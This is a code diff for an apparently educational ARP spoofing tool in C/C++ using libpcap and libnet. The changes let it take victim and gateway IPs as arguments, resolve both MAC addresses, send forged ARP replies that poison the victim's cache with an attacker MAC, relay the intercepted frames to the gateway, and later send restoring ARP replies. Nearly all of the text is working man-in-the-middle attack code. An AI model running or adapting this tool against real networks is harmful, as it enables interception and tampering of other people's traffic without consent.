@@ -8,42 +8,34 @@
 
 int RECOVERY_CHECK = 1;
 
+#pragma pack(push, 1)
 struct custom_arp_hdr
 {
-    uint16_t ar_hrd;         /* format of hardware address */
-#define ARPHRD_NETROM   0   /* from KA9Q: NET/ROM pseudo */
-#define ARPHRD_ETHER    1   /* Ethernet 10Mbps */
-#define ARPHRD_EETHER   2   /* Experimental Ethernet */
-#define ARPHRD_AX25     3   /* AX.25 Level 2 */
-#define ARPHRD_PRONET   4   /* PROnet token ring */
-#define ARPHRD_CHAOS    5   /* Chaosnet */
-#define ARPHRD_IEEE802  6   /* IEEE 802.2 Ethernet/TR/TB */
-#define ARPHRD_ARCNET   7   /* ARCnet */
-#define ARPHRD_APPLETLK 8   /* APPLEtalk */
-#define ARPHRD_LANSTAR  9   /* Lanstar */
-#define ARPHRD_DLCI     15  /* Frame Relay DLCI */
-#define ARPHRD_ATM      19  /* ATM */
-#define ARPHRD_METRICOM 23  /* Metricom STRIP (new IANA id) */
-#define ARPHRD_IPSEC    31  /* IPsec tunnel */
-    uint16_t ar_pro;         /* format of protocol address */
-    uint8_t  ar_hln;         /* length of hardware address */
-    uint8_t  ar_pln;         /* length of protocol addres */
-    uint16_t ar_op;          /* operation type */
-#define ARPOP_REQUEST    1  /* req to resolve address */
-#define ARPOP_REPLY      2  /* resp to previous request */
-#define ARPOP_REVREQUEST 3  /* req protocol address given hardware */
-#define ARPOP_REVREPLY   4  /* resp giving protocol address */
-#define ARPOP_INVREQUEST 8  /* req to identify peer */
-#define ARPOP_INVREPLY   9  /* resp identifying peer */
-    /* address information allocated dynamically */
+    uint16_t ar_hrd;
+    uint16_t ar_pro;
+    uint8_t  ar_hln;
+    uint8_t  ar_pln;
+    uint16_t ar_op;
     uint8_t ar_sha[6];
-    uint8_t ar_sip[4];
+    uint32_t ar_sip;
     uint8_t ar_tha[6];
-    uint8_t ar_tip[4];
+    uint32_t ar_tip;
 };
+#pragma pack(pop)
+
+typedef struct thread_value
+{
+    char *sender_value;
+    u_int victim_value;
+    u_int gateway_value;
+}thread_value;
 
 void *packet_handler(void *arg)
 {
+    thread_value* pi = (thread_value*)arg;
+    char *sender_v = pi -> sender_value;
+    u_int victim_v = pi -> victim_value;
+    u_int gateway_v = pi -> gateway_value;
     char errbuf_th[PCAP_ERRBUF_SIZE];
     pcap_t *handle_th;
 
@@ -59,51 +51,45 @@ void *packet_handler(void *arg)
     libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)send_buf;
     custom_arp_hdr* arp_header = (custom_arp_hdr*)(send_buf + sizeof(libnet_ethernet_hdr));
 
-    eth_header->ether_dhost[0] = 0xff;
-    eth_header->ether_dhost[1] = 0xff;
-    eth_header->ether_dhost[2] = 0xff;
-    eth_header->ether_dhost[3] = 0xff;
-    eth_header->ether_dhost[4] = 0xff;
-    eth_header->ether_dhost[5] = 0xff;
+    eth_header->ether_dhost[0] = sender_v[0];
+    eth_header->ether_dhost[1] = sender_v[1];
+    eth_header->ether_dhost[2] = sender_v[2];
+    eth_header->ether_dhost[3] = sender_v[3];
+    eth_header->ether_dhost[4] = sender_v[4];
+    eth_header->ether_dhost[5] = sender_v[5];
 
-    eth_header->ether_shost[0] = 0x00;
-    eth_header->ether_shost[1] = 0x0c;
-    eth_header->ether_shost[2] = 0x29;
-    eth_header->ether_shost[3] = 0x97;
-    eth_header->ether_shost[4] = 0x9f;
-    eth_header->ether_shost[5] = 0xb2;
+    eth_header->ether_shost[0] = 0x0a;
+    eth_header->ether_shost[1] = 0x0b;
+    eth_header->ether_shost[2] = 0x0c;
+    eth_header->ether_shost[3] = 0x0d;
+    eth_header->ether_shost[4] = 0x0e;
+    eth_header->ether_shost[5] = 0x0f; // virtual attacker mac
 
     eth_header->ether_type = htons(ETHERTYPE_ARP);
 
-    arp_header->ar_hrd = htons(0x0001);
+    arp_header->ar_hrd = htons(ARPHRD_ETHER);
     arp_header->ar_pro = htons(ETHERTYPE_IP);
     arp_header->ar_hln = 6;
     arp_header->ar_pln = 4;
     arp_header->ar_op = htons(ARPOP_REPLY);
 
-    arp_header->ar_sha[0] = 0x00;
-    arp_header->ar_sha[1] = 0x0c;
-    arp_header->ar_sha[2] = 0x29;
-    arp_header->ar_sha[3] = 0x97;
-    arp_header->ar_sha[4] = 0x9f;
-    arp_header->ar_sha[5] = 0xb2;
+    arp_header->ar_sha[0] = 0x0a;
+    arp_header->ar_sha[1] = 0x0b;
+    arp_header->ar_sha[2] = 0x0c;
+    arp_header->ar_sha[3] = 0x0d;
+    arp_header->ar_sha[4] = 0x0e;
+    arp_header->ar_sha[5] = 0x0f; // virtual attacker mac
 
-    arp_header->ar_sip[0] = 0xc0;
-    arp_header->ar_sip[1] = 0xa8;
-    arp_header->ar_sip[2] = 0xa2;
-    arp_header->ar_sip[3] = 0x02;
+    arp_header->ar_sip = gateway_v;
 
-    arp_header->ar_tha[0] = 0xff;
-    arp_header->ar_tha[1] = 0xff;
-    arp_header->ar_tha[2] = 0xff;
-    arp_header->ar_tha[3] = 0xff;
-    arp_header->ar_tha[4] = 0xff;
-    arp_header->ar_tha[5] = 0xff;
+    arp_header->ar_tha[0] = sender_v[0];
+    arp_header->ar_tha[1] = sender_v[1];
+    arp_header->ar_tha[2] = sender_v[2];
+    arp_header->ar_tha[3] = sender_v[3];
+    arp_header->ar_tha[4] = sender_v[4];
+    arp_header->ar_tha[5] = sender_v[5];
 
-    arp_header->ar_tip[0] = 0xff;
-    arp_header->ar_tip[1] = 0xff;
-    arp_header->ar_tip[2] = 0xff;
-    arp_header->ar_tip[3] = 0xff;
+    arp_header->ar_tip = victim_v;
 
     for(int i = 42; i <= 59; i++) send_buf[i] = 0x00;
 
@@ -128,13 +114,22 @@ void *recovery_handler(void *arg)
 
         if(RECOVERY_CHECK == 0) break;
     }
+
+    return 0;
 }
 
-int main()
+int main(int argc, char **argv)
 {
-    char *dev, errbuf[PCAP_ERRBUF_SIZE];
+    if(argc != 3){
+        std::cout<<"Usage : "<<argv[0]<<" <Sender IP> <Receiver IP>"<<std::endl;
+        exit(1);
+    }
+
+    char *dev, errbuf[PCAP_ERRBUF_SIZE], receiver_mac[6], sender_mac[6];
+    u_int victim_ip, gateway_ip;
     pcap_t *handle;
     pthread_t packet_threads, recovery_threads;
+    thread_value thread_data;
 
     dev = pcap_lookupdev(errbuf);
 
@@ -152,7 +147,166 @@ int main()
         return(2);
     }
 
-    if(pthread_create(&packet_threads, NULL, packet_handler, (void*)NULL) < 0)
+    victim_ip = inet_addr(argv[1]);
+    gateway_ip = inet_addr(argv[2]);
+
+    while(1){ //get gateway mac address
+        const u_char *p_gateway;
+        struct pcap_pkthdr *h_gateway;
+        int res_gateway = pcap_next_ex(handle, &h_gateway, &p_gateway);
+        struct custom_arp_hdr* arp_gwcheck = (struct custom_arp_hdr*)(p_gateway + sizeof(struct libnet_ethernet_hdr));
+        u_char gateway_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)] =  {0,};
+        libnet_ethernet_hdr* eth_gateway = (libnet_ethernet_hdr*)gateway_buf;
+        custom_arp_hdr* arp_gateway = (custom_arp_hdr*)(gateway_buf + sizeof(libnet_ethernet_hdr));
+
+        eth_gateway->ether_dhost[0] = 0xff;
+        eth_gateway->ether_dhost[1] = 0xff;
+        eth_gateway->ether_dhost[2] = 0xff;
+        eth_gateway->ether_dhost[3] = 0xff;
+        eth_gateway->ether_dhost[4] = 0xff;
+        eth_gateway->ether_dhost[5] = 0xff;
+
+        eth_gateway->ether_shost[0] = 0x00;
+        eth_gateway->ether_shost[1] = 0x0c;
+        eth_gateway->ether_shost[2] = 0x29;
+        eth_gateway->ether_shost[3] = 0x97;
+        eth_gateway->ether_shost[4] = 0x9f;
+        eth_gateway->ether_shost[5] = 0xb2;
+
+        eth_gateway->ether_type = htons(ETHERTYPE_ARP);
+
+        arp_gateway->ar_hrd = htons(ARPHRD_ETHER);
+        arp_gateway->ar_pro = htons(ETHERTYPE_IP);
+        arp_gateway->ar_hln = 6;
+        arp_gateway->ar_pln = 4;
+        arp_gateway->ar_op = htons(ARPOP_REQUEST);
+
+        arp_gateway->ar_sha[0] = 0x00;
+        arp_gateway->ar_sha[1] = 0x0c;
+        arp_gateway->ar_sha[2] = 0x29;
+        arp_gateway->ar_sha[3] = 0x97;
+        arp_gateway->ar_sha[4] = 0x9f;
+        arp_gateway->ar_sha[5] = 0xb2;
+
+        arp_gateway->ar_sip = inet_addr("192.168.162.130");
+
+        arp_gateway->ar_tha[0] = 0x00;
+        arp_gateway->ar_tha[1] = 0x00;
+        arp_gateway->ar_tha[2] = 0x00;
+        arp_gateway->ar_tha[3] = 0x00;
+        arp_gateway->ar_tha[4] = 0x00;
+        arp_gateway->ar_tha[5] = 0x00;
+
+        arp_gateway->ar_tip = inet_addr(argv[2]);
+
+        if(pcap_sendpacket(handle, (u_char*)gateway_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr))) != 0)
+            std::cout<<"Request gateway packet error\n";
+
+        else{
+            for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)); i++) printf("%02x ", gateway_buf[i]);
+
+            std::cout<<"Send request gateway packet\n";
+         }
+
+        if(res_gateway == 1){
+            if(arp_gwcheck->ar_sip == inet_addr(argv[2])){
+                receiver_mac[0] = arp_gwcheck->ar_sha[0];
+                receiver_mac[1] = arp_gwcheck->ar_sha[1];
+                receiver_mac[2] = arp_gwcheck->ar_sha[2];
+                receiver_mac[3] = arp_gwcheck->ar_sha[3];
+                receiver_mac[4] = arp_gwcheck->ar_sha[4];
+                receiver_mac[5] = arp_gwcheck->ar_sha[5];
+
+                std::cout<<"Find gateway mac address\n";
+
+                break;
+            }
+        }
+
+        sleep(1);
+    }
+
+    while(1){ //get sender mac address
+        const u_char *p_sender;
+        struct pcap_pkthdr *h_sender;
+        int res_sender = pcap_next_ex(handle, &h_sender, &p_sender);
+        struct custom_arp_hdr* arp_sdcheck = (struct custom_arp_hdr*)(p_sender + sizeof(struct libnet_ethernet_hdr));
+        u_char sender_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)] =  {0,};
+        libnet_ethernet_hdr* eth_sender = (libnet_ethernet_hdr*)sender_buf;
+        custom_arp_hdr* arp_sender = (custom_arp_hdr*)(sender_buf + sizeof(libnet_ethernet_hdr));
+
+        eth_sender->ether_dhost[0] = 0xff;
+        eth_sender->ether_dhost[1] = 0xff;
+        eth_sender->ether_dhost[2] = 0xff;
+        eth_sender->ether_dhost[3] = 0xff;
+        eth_sender->ether_dhost[4] = 0xff;
+        eth_sender->ether_dhost[5] = 0xff;
+
+        eth_sender->ether_shost[0] = 0x00;
+        eth_sender->ether_shost[1] = 0x0c;
+        eth_sender->ether_shost[2] = 0x29;
+        eth_sender->ether_shost[3] = 0x97;
+        eth_sender->ether_shost[4] = 0x9f;
+        eth_sender->ether_shost[5] = 0xb2;
+
+        eth_sender->ether_type = htons(ETHERTYPE_ARP);
+
+        arp_sender->ar_hrd = htons(ARPHRD_ETHER);
+        arp_sender->ar_pro = htons(ETHERTYPE_IP);
+        arp_sender->ar_hln = 6;
+        arp_sender->ar_pln = 4;
+        arp_sender->ar_op = htons(ARPOP_REQUEST);
+
+        arp_sender->ar_sha[0] = 0x00;
+        arp_sender->ar_sha[1] = 0x0c;
+        arp_sender->ar_sha[2] = 0x29;
+        arp_sender->ar_sha[3] = 0x97;
+        arp_sender->ar_sha[4] = 0x9f;
+        arp_sender->ar_sha[5] = 0xb2;
+
+        arp_sender->ar_sip = inet_addr("192.168.162.130");
+
+        arp_sender->ar_tha[0] = 0x00;
+        arp_sender->ar_tha[1] = 0x00;
+        arp_sender->ar_tha[2] = 0x00;
+        arp_sender->ar_tha[3] = 0x00;
+        arp_sender->ar_tha[4] = 0x00;
+        arp_sender->ar_tha[5] = 0x00;
+
+        arp_sender->ar_tip = inet_addr(argv[1]);
+
+        if(pcap_sendpacket(handle, (u_char*)sender_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr))) != 0)
+            std::cout<<"Request sender packet error\n";
+
+        else{
+            for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)); i++) printf("%02x ", sender_buf[i]);
+
+            std::cout<<"Send request sender packet\n";
+         }
+
+        if(res_sender == 1){
+            if(arp_sdcheck->ar_sip == inet_addr(argv[1])){
+                sender_mac[0] = arp_sdcheck->ar_sha[0];
+                sender_mac[1] = arp_sdcheck->ar_sha[1];
+                sender_mac[2] = arp_sdcheck->ar_sha[2];
+                sender_mac[3] = arp_sdcheck->ar_sha[3];
+                sender_mac[4] = arp_sdcheck->ar_sha[4];
+                sender_mac[5] = arp_sdcheck->ar_sha[5];
+
+                std::cout<<"Find sender mac address\n";
+
+                break;
+            }
+        }
+
+        sleep(1);
+    }
+
+    thread_data.sender_value = sender_mac;
+    thread_data.victim_value = victim_ip;
+    thread_data.gateway_value = gateway_ip;
+
+    if(pthread_create(&packet_threads, NULL, packet_handler, (void*)&thread_data) < 0)
         std::cout<<"Packet thread error";
 
     if(pthread_create(&recovery_threads, NULL, recovery_handler, (void*)NULL) < 0)
@@ -167,17 +321,26 @@ int main()
         if(res == -1) break;
         if(res == 1){
             if((eth_check->ether_shost[0] == 0x00) &&
-                    ((eth_check->ether_shost[1]) == 0x0c) &&
-                    ((eth_check->ether_shost[2]) == 0x29) &&
-                    ((eth_check->ether_shost[3]) == 0x81) &&
-                    ((eth_check->ether_shost[4]) == 0x57) &&
-                    ((eth_check->ether_shost[5]) == 0x56)){
-                eth_check->ether_dhost[0] = 0x00;
-                eth_check->ether_dhost[1] = 0x50;
-                eth_check->ether_dhost[2] = 0x56;
-                eth_check->ether_dhost[3] = 0xfe;
-                eth_check->ether_dhost[4] = 0x33;
-                eth_check->ether_dhost[5] = 0x65;
+                    (eth_check->ether_shost[1] == 0x0c) &&
+                    (eth_check->ether_shost[2] == 0x29) &&
+                    (eth_check->ether_shost[3] == 0x81) &&
+                    (eth_check->ether_shost[4] == 0x57) &&
+                    (eth_check->ether_shost[5] == 0x56)){ // victim mac
+                eth_check->ether_dhost[0] = receiver_mac[0];
+                eth_check->ether_dhost[1] = receiver_mac[1];
+                eth_check->ether_dhost[2] = receiver_mac[2];
+                eth_check->ether_dhost[3] = receiver_mac[3];
+                eth_check->ether_dhost[4] = receiver_mac[4];
+                eth_check->ether_dhost[5] = receiver_mac[5]; // gateway mac
+
+                eth_check->ether_shost[0] = 0x0a;
+                eth_check->ether_shost[1] = 0x0b;
+                eth_check->ether_shost[2] = 0x0c;
+                eth_check->ether_shost[3] = 0x0d;
+                eth_check->ether_shost[4] = 0x0e;
+                eth_check->ether_shost[5] = 0x0f; // victim mac (x) virtual attacker mac (o)
+
+                 //++ shost->attack mac plus
 
                 if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay error\n";
 
@@ -192,51 +355,45 @@ int main()
     libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)recovery_buf;
     custom_arp_hdr* arp_header = (custom_arp_hdr*)(recovery_buf + sizeof(libnet_ethernet_hdr));
 
-    eth_header->ether_dhost[0] = 0x00;
-    eth_header->ether_dhost[1] = 0x0c;
-    eth_header->ether_dhost[2] = 0x29;
-    eth_header->ether_dhost[3] = 0x81;
-    eth_header->ether_dhost[4] = 0x57;
-    eth_header->ether_dhost[5] = 0x56;
+    eth_header->ether_dhost[0] = sender_mac[0];
+    eth_header->ether_dhost[1] = sender_mac[1];
+    eth_header->ether_dhost[2] = sender_mac[2];
+    eth_header->ether_dhost[3] = sender_mac[3];
+    eth_header->ether_dhost[4] = sender_mac[4];
+    eth_header->ether_dhost[5] = sender_mac[5]; // victim mac
 
-    eth_header->ether_shost[0] = 0x00;
-    eth_header->ether_shost[1] = 0x50;
-    eth_header->ether_shost[2] = 0x56;
-    eth_header->ether_shost[3] = 0xfe;
-    eth_header->ether_shost[4] = 0x33;
-    eth_header->ether_shost[5] = 0x65;
+    eth_header->ether_shost[0] = receiver_mac[0];
+    eth_header->ether_shost[1] = receiver_mac[1];
+    eth_header->ether_shost[2] = receiver_mac[2];
+    eth_header->ether_shost[3] = receiver_mac[3];
+    eth_header->ether_shost[4] = receiver_mac[4];
+    eth_header->ether_shost[5] = receiver_mac[5]; // gateway mac not change
 
     eth_header->ether_type = htons(ETHERTYPE_ARP);
 
-    arp_header->ar_hrd = htons(0x0001);
+    arp_header->ar_hrd = htons(ARPHRD_ETHER);
     arp_header->ar_pro = htons(ETHERTYPE_IP);
     arp_header->ar_hln = 6;
     arp_header->ar_pln = 4;
     arp_header->ar_op = htons(ARPOP_REPLY);
 
-    arp_header->ar_sha[0] = 0x00;
-    arp_header->ar_sha[1] = 0x50;
-    arp_header->ar_sha[2] = 0x56;
-    arp_header->ar_sha[3] = 0xfe;
-    arp_header->ar_sha[4] = 0x33;
-    arp_header->ar_sha[5] = 0x65;
+    arp_header->ar_sha[0] = receiver_mac[0];
+    arp_header->ar_sha[1] = receiver_mac[1];
+    arp_header->ar_sha[2] = receiver_mac[2];
+    arp_header->ar_sha[3] = receiver_mac[3];
+    arp_header->ar_sha[4] = receiver_mac[4];
+    arp_header->ar_sha[5] = receiver_mac[5]; // gateway mac not change
 
-    arp_header->ar_sip[0] = 0xc0;
-    arp_header->ar_sip[1] = 0xa8;
-    arp_header->ar_sip[2] = 0xa2;
-    arp_header->ar_sip[3] = 0x02;
+    arp_header->ar_sip = inet_addr(argv[2]);// gateway ip not change
 
     arp_header->ar_tha[0] = 0x00;
     arp_header->ar_tha[1] = 0x0c;
     arp_header->ar_tha[2] = 0x29;
     arp_header->ar_tha[3] = 0x81;
     arp_header->ar_tha[4] = 0x57;
-    arp_header->ar_tha[5] = 0x56;
+    arp_header->ar_tha[5] = 0x56; // victim mac
 
-    arp_header->ar_tip[0] = 0xc0;
-    arp_header->ar_tip[1] = 0xa8;
-    arp_header->ar_tip[2] = 0xa2;
-    arp_header->ar_tip[3] = 0x84;
+    arp_header->ar_tip = inet_addr(argv[1]); // victim ip
 
     for(int i = 42; i <= 59; i++) recovery_buf[i] = 0x00;
 
